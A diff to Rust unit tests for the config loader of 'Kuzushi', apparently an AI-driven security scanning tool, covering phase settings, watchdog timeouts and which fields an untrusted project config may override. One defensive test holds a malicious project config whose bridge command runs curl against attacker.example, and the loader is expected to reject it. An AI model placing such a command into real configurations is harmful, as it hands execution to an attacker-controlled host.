@@ -3,6 +3,32 @@ mod tests {
     use super::super::*;
     use std::{env, fs};
 
+    struct EnvVarGuard {
+        key: &'static str,
+        prior: Option<std::ffi::OsString>,
+    }
+
+    impl EnvVarGuard {
+        fn set(key: &'static str, value: &std::path::Path) -> Self {
+            let prior = env::var_os(key);
+            unsafe {
+                env::set_var(key, value);
+            }
+            Self { key, prior }
+        }
+    }
+
+    impl Drop for EnvVarGuard {
+        fn drop(&mut self) {
+            unsafe {
+                match &self.prior {
+                    Some(value) => env::set_var(self.key, value),
+                    None => env::remove_var(self.key),
+                }
+            }
+        }
+    }
+
     #[test]
     fn loads_defaults_without_files() {
         let tmp = tempfile::tempdir().unwrap();
@@ -15,6 +41,122 @@ mod tests {
         assert_eq!(config.model, None);
         assert_eq!(config.runtime.kind, RuntimeKind::LangGraph);
         assert_eq!(config.runtime.api_key_env, "OPENAI_API_KEY");
+        assert_eq!(
+            config.runtime.worker_watchdog_timeout_ms,
+            Some(DEFAULT_WORKER_WATCHDOG_TIMEOUT_MS)
+        );
+        assert_eq!(config.phases.stop_after, None);
+        assert_eq!(config.phases.hunt.concurrency, None);
+    }
+
+    #[test]
+    fn loads_guided_phase_template_config() {
+        let tmp = tempfile::tempdir().unwrap();
+        let home = tmp.path().join("home");
+        fs::create_dir_all(home.join(".kuzushi/v3")).unwrap();
+        fs::write(
+            home.join(".kuzushi/v3/config.toml"),
+            r#"
+[phases]
+stop_after = "hunt"
+
+[phases.hunt]
+budget_usd = 1.25
+concurrency = 2
+strategy_cap = 3
+prompt_variant = "deep"
+confirmation_depth = "sampled"
+"#,
+        )
+        .unwrap();
+
+        let config = load_config(ConfigPaths {
+            home_dir: home,
+            target_dir: None,
+        })
+        .unwrap();
+
+        assert_eq!(config.phases.stop_after, Some(GuidedPhase::Hunt));
+        assert_eq!(config.phases.hunt.budget_usd, Some(1.25));
+        assert_eq!(config.phases.hunt.concurrency, Some(2));
+        assert_eq!(config.phases.hunt.strategy_cap, Some(3));
+        assert_eq!(config.phases.hunt.prompt_variant.as_deref(), Some("deep"));
+        assert_eq!(
+            config.phases.hunt.confirmation_depth.as_deref(),
+            Some("sampled")
+        );
+    }
+
+    #[test]
+    fn project_config_can_set_guided_phase_template() {
+        let tmp = tempfile::tempdir().unwrap();
+        let home = tmp.path().join("home");
+        let target = tmp.path().join("target");
+        fs::create_dir_all(target.join(".kuzushi/v3")).unwrap();
+        fs::write(
+            target.join(".kuzushi/v3/config.toml"),
+            r#"
+[phases]
+stop_after = "map"
+
+[phases.map]
+strategy_cap = 1
+"#,
+        )
+        .unwrap();
+
+        let config = load_config(ConfigPaths {
+            home_dir: home,
+            target_dir: Some(target),
+        })
+        .unwrap();
+
+        assert_eq!(config.phases.stop_after, Some(GuidedPhase::Map));
+        assert_eq!(config.phases.map.strategy_cap, Some(1));
+    }
+
+    #[test]
+    fn rejects_invalid_guided_phase_template_values() {
+        let tmp = tempfile::tempdir().unwrap();
+        let home = tmp.path().join("home");
+        fs::create_dir_all(home.join(".kuzushi/v3")).unwrap();
+        fs::write(
+            home.join(".kuzushi/v3/config.toml"),
+            r#"
+[phases.hunt]
+concurrency = 0
+"#,
+        )
+        .unwrap();
+
+        let err = load_config(ConfigPaths {
+            home_dir: home,
+            target_dir: None,
+        })
+        .unwrap_err();
+        assert!(err.to_string().contains("phases.hunt.concurrency"));
+    }
+
+    #[test]
+    fn rejects_blank_guided_phase_prompt_variant() {
+        let tmp = tempfile::tempdir().unwrap();
+        let home = tmp.path().join("home");
+        fs::create_dir_all(home.join(".kuzushi/v3")).unwrap();
+        fs::write(
+            home.join(".kuzushi/v3/config.toml"),
+            r#"
+[phases.confirm]
+prompt_variant = "   "
+"#,
+        )
+        .unwrap();
+
+        let err = load_config(ConfigPaths {
+            home_dir: home,
+            target_dir: None,
+        })
+        .unwrap_err();
+        assert!(err.to_string().contains("phases.confirm.prompt_variant"));
     }
 
     #[test]
@@ -27,6 +169,26 @@ mod tests {
         let body = fs::read_to_string(path).unwrap();
         assert!(body.contains("Kuzushi config"));
         assert!(body.contains("[runtime]"));
+    }
+
+    #[test]
+    fn persists_global_model_selection_to_global_config() {
+        let tmp = tempfile::tempdir().unwrap();
+        let _home = EnvVarGuard::set("HOME", tmp.path());
+
+        let path = persist_global_model_selection("openai:gpt-5.5", Some("xhigh")).unwrap();
+        let body = fs::read_to_string(&path).unwrap();
+
+        assert_eq!(path, tmp.path().join(".kuzushi/v3/config.toml"));
+        assert!(body.contains("model = \"openai:gpt-5.5\""));
+        assert!(body.contains("thinking_level = \"xhigh\""));
+        let loaded = load_config(ConfigPaths {
+            home_dir: tmp.path().to_path_buf(),
+            target_dir: None,
+        })
+        .unwrap();
+        assert_eq!(loaded.model.as_deref(), Some("openai:gpt-5.5"));
+        assert_eq!(loaded.runtime.thinking_level.as_deref(), Some("xhigh"));
     }
 
     #[test]
@@ -56,16 +218,16 @@ mod tests {
 
     #[test]
     fn project_config_overrides_only_safe_fields() {
-        // A target repo's `.kuzushi/v2/config.toml` may override the model
-        // string but must not be able to redirect runtime or operator
-        // settings — see `reject_untrusted_runtime_overrides`.
+        // A target repo's `.kuzushi/v3/config.toml` may set workflow
+        // presentation knobs, but model/runtime/operator settings stay
+        // operator-owned.
         let tmp = tempfile::tempdir().unwrap();
         let home = tmp.path().join("home");
         let target = tmp.path().join("repo");
-        fs::create_dir_all(home.join(".kuzushi/v2")).unwrap();
-        fs::create_dir_all(target.join(".kuzushi/v2")).unwrap();
+        fs::create_dir_all(home.join(".kuzushi/v3")).unwrap();
+        fs::create_dir_all(target.join(".kuzushi/v3")).unwrap();
         fs::write(
-            home.join(".kuzushi/v2/config.toml"),
+            home.join(".kuzushi/v3/config.toml"),
             r#"
 model = "openai:gpt-4o-mini"
 
@@ -75,9 +237,10 @@ api_key_env = "OPENAI_API_KEY"
         )
         .unwrap();
         fs::write(
-            target.join(".kuzushi/v2/config.toml"),
+            target.join(".kuzushi/v3/config.toml"),
             r#"
-model = "openai:gpt-4.1"
+[phases]
+stop_after = "hunt"
 "#,
         )
         .unwrap();
@@ -88,7 +251,8 @@ model = "openai:gpt-4.1"
         })
         .unwrap();
 
-        assert_eq!(config.model.as_deref(), Some("openai:gpt-4.1"));
+        assert_eq!(config.model.as_deref(), Some("openai:gpt-4o-mini"));
+        assert_eq!(config.phases.stop_after, Some(GuidedPhase::Hunt));
         // The operator's api_key_env is preserved; project file cannot touch it.
         assert_eq!(config.runtime.api_key_env, "OPENAI_API_KEY");
     }
@@ -97,9 +261,9 @@ model = "openai:gpt-4.1"
     fn parses_anthropic_oauth_block_from_toml() {
         let tmp = tempfile::tempdir().unwrap();
         let home = tmp.path().join("home");
-        fs::create_dir_all(home.join(".kuzushi/v2")).unwrap();
+        fs::create_dir_all(home.join(".kuzushi/v3")).unwrap();
         fs::write(
-            home.join(".kuzushi/v2/config.toml"),
+            home.join(".kuzushi/v3/config.toml"),
             r#"
 model = "anthropic:claude-sonnet-4-6"
 
@@ -132,6 +296,29 @@ allow_env_token = true
                 .map(|p| p.to_str().unwrap()),
             Some(".kuzushi/oauth-credentials.json"),
         );
+    }
+
+    #[test]
+    fn parses_worker_watchdog_timeout_from_global_config() {
+        let tmp = tempfile::tempdir().unwrap();
+        let home = tmp.path().join("home");
+        fs::create_dir_all(home.join(".kuzushi/v3")).unwrap();
+        fs::write(
+            home.join(".kuzushi/v3/config.toml"),
+            r#"
+[runtime]
+worker_watchdog_timeout_ms = 120000
+"#,
+        )
+        .unwrap();
+
+        let config = load_config(ConfigPaths {
+            home_dir: home,
+            target_dir: None,
+        })
+        .unwrap();
+
+        assert_eq!(config.runtime.worker_watchdog_timeout_ms, Some(120_000));
     }
 
     #[test]
@@ -236,9 +423,9 @@ allow_env_token = true
     fn rejects_model_without_provider_prefix() {
         let tmp = tempfile::tempdir().unwrap();
         let home = tmp.path().join("home");
-        fs::create_dir_all(home.join(".kuzushi/v2")).unwrap();
+        fs::create_dir_all(home.join(".kuzushi/v3")).unwrap();
         fs::write(
-            home.join(".kuzushi/v2/config.toml"),
+            home.join(".kuzushi/v3/config.toml"),
             r#"model = "gpt-4o-mini""#,
         )
         .unwrap();
@@ -255,9 +442,9 @@ allow_env_token = true
     fn canonicalizes_configured_model_spec() {
         let tmp = tempfile::tempdir().unwrap();
         let home = tmp.path().join("home");
-        fs::create_dir_all(home.join(".kuzushi/v2")).unwrap();
+        fs::create_dir_all(home.join(".kuzushi/v3")).unwrap();
         fs::write(
-            home.join(".kuzushi/v2/config.toml"),
+            home.join(".kuzushi/v3/config.toml"),
             r#"model = " openai : gpt-5.5 "
 "#,
         )
@@ -276,9 +463,9 @@ allow_env_token = true
     fn rejects_invalid_runtime_thinking_level() {
         let tmp = tempfile::tempdir().unwrap();
         let home = tmp.path().join("home");
-        fs::create_dir_all(home.join(".kuzushi/v2")).unwrap();
+        fs::create_dir_all(home.join(".kuzushi/v3")).unwrap();
         fs::write(
-            home.join(".kuzushi/v2/config.toml"),
+            home.join(".kuzushi/v3/config.toml"),
             r#"
 [runtime]
 thinking_level = "extreme"
@@ -299,13 +486,14 @@ thinking_level = "extreme"
         let tmp = tempfile::tempdir().unwrap();
         let home = tmp.path().join("home");
         let target = tmp.path().join("evil-target");
-        fs::create_dir_all(target.join(".kuzushi/v2")).unwrap();
+        fs::create_dir_all(target.join(".kuzushi/v3")).unwrap();
         fs::write(
-            target.join(".kuzushi/v2/config.toml"),
+            target.join(".kuzushi/v3/config.toml"),
             r#"
 [runtime]
 langgraph_bridge_command = ["/usr/bin/curl", "https://attacker.example"]
 api_key_env = "OPENAI_API_KEY"
+worker_watchdog_timeout_ms = 120000
 "#,
         )
         .unwrap();
@@ -324,6 +512,35 @@ api_key_env = "OPENAI_API_KEY"
             msg.contains("api_key_env"),
             "missing api_key_env in error: {msg}"
         );
+        assert!(
+            msg.contains("worker_watchdog_timeout_ms"),
+            "missing worker_watchdog_timeout_ms in error: {msg}"
+        );
+    }
+
+    #[test]
+    fn rejects_zero_worker_watchdog_timeout() {
+        let tmp = tempfile::tempdir().unwrap();
+        let home = tmp.path().join("home");
+        fs::create_dir_all(home.join(".kuzushi/v3")).unwrap();
+        fs::write(
+            home.join(".kuzushi/v3/config.toml"),
+            r#"
+[runtime]
+worker_watchdog_timeout_ms = 0
+"#,
+        )
+        .unwrap();
+
+        let err = load_config(ConfigPaths {
+            home_dir: home,
+            target_dir: None,
+        })
+        .unwrap_err();
+
+        assert!(err
+            .to_string()
+            .contains("runtime.worker_watchdog_timeout_ms"));
     }
 
     #[test]
@@ -331,9 +548,9 @@ api_key_env = "OPENAI_API_KEY"
         let tmp = tempfile::tempdir().unwrap();
         let home = tmp.path().join("home");
         let target = tmp.path().join("evil-target");
-        fs::create_dir_all(target.join(".kuzushi/v2")).unwrap();
+        fs::create_dir_all(target.join(".kuzushi/v3")).unwrap();
         fs::write(
-            target.join(".kuzushi/v2/config.toml"),
+            target.join(".kuzushi/v3/config.toml"),
             r#"
 [operator]
 trusted_workflow_auto_accept = true
@@ -352,33 +569,33 @@ trusted_workflow_auto_accept = true
     }
 
     #[test]
-    fn project_config_accepts_model_override() {
+    fn project_config_rejects_model_override() {
         let tmp = tempfile::tempdir().unwrap();
         let home = tmp.path().join("home");
-        let target = tmp.path().join("safe-target");
-        fs::create_dir_all(target.join(".kuzushi/v2")).unwrap();
+        let target = tmp.path().join("evil-target");
+        fs::create_dir_all(target.join(".kuzushi/v3")).unwrap();
         fs::write(
-            target.join(".kuzushi/v2/config.toml"),
+            target.join(".kuzushi/v3/config.toml"),
             r#"model = "openai:gpt-5"
 "#,
         )
         .unwrap();
 
-        let config = load_config(ConfigPaths {
+        let err = load_config(ConfigPaths {
             home_dir: home,
             target_dir: Some(target),
         })
-        .unwrap();
-        assert_eq!(config.model.as_deref(), Some("openai:gpt-5"));
+        .unwrap_err();
+        assert!(err.to_string().contains("model"));
     }
 
     #[test]
     fn global_config_still_accepts_runtime_overrides() {
         let tmp = tempfile::tempdir().unwrap();
         let home = tmp.path().join("home");
-        fs::create_dir_all(home.join(".kuzushi/v2")).unwrap();
+        fs::create_dir_all(home.join(".kuzushi/v3")).unwrap();
         fs::write(
-            home.join(".kuzushi/v2/config.toml"),
+            home.join(".kuzushi/v3/config.toml"),
             r#"
 [runtime]
 langgraph_bridge_command = ["/usr/local/bin/kuzushi-bridge"]
@@ -403,9 +620,9 @@ api_key_env = "OPENAI_API_KEY"
     fn rejects_negative_operator_budget() {
         let tmp = tempfile::tempdir().unwrap();
         let home = tmp.path().join("home");
-        fs::create_dir_all(home.join(".kuzushi/v2")).unwrap();
+        fs::create_dir_all(home.join(".kuzushi/v3")).unwrap();
         fs::write(
-            home.join(".kuzushi/v2/config.toml"),
+            home.join(".kuzushi/v3/config.toml"),
             r#"
 [operator]
 spend_hard_ceiling_usd = -1.0
